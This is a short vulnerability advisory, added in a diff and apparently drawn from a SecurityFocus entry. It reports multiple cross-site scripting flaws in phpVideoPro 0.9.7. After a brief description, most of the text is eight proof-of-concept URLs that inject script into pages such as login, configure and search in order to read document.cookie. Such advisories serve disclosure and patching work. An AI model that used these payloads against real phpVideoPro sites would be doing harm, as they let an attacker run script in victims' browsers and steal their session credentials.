@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/51428/info
+
+phpVideoPro is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+phpVideoPro 0.9.7 is vulnerable; prior versions may also be affected. 
+
+http://www.example.com/phpvideopro-0.9.7/help/index.php?topic=&#039;"</script><script>alert(document.cookie)</script>
+http://www.example.com/phpvideopro-0.9.7/login/"><script>alert(document.cookie)</script><"
+http://www.example.com/phpvideopro-0.9.7/configure.php/"><script>alert(document.cookie)</script><"
+http://www.example.com/phpvideopro-0.9.7/medialist.php/"><script>alert(document.cookie)</script><"
+http://www.example.com/phpvideopro-0.9.7/setfilter.php/"><script>alert(document.cookie)</script><"
+http://www.example.com/phpvideopro-0.9.7/search.php/"><script>alert(document.cookie)</script><"
+http://www.example.com/phpvideopro-0.9.7/listgen.php/"><script>alert(document.cookie)</script><"
+http://www.example.com/phpvideopro-0.9.7/label.php/"><script>alert(document.cookie)</script><"
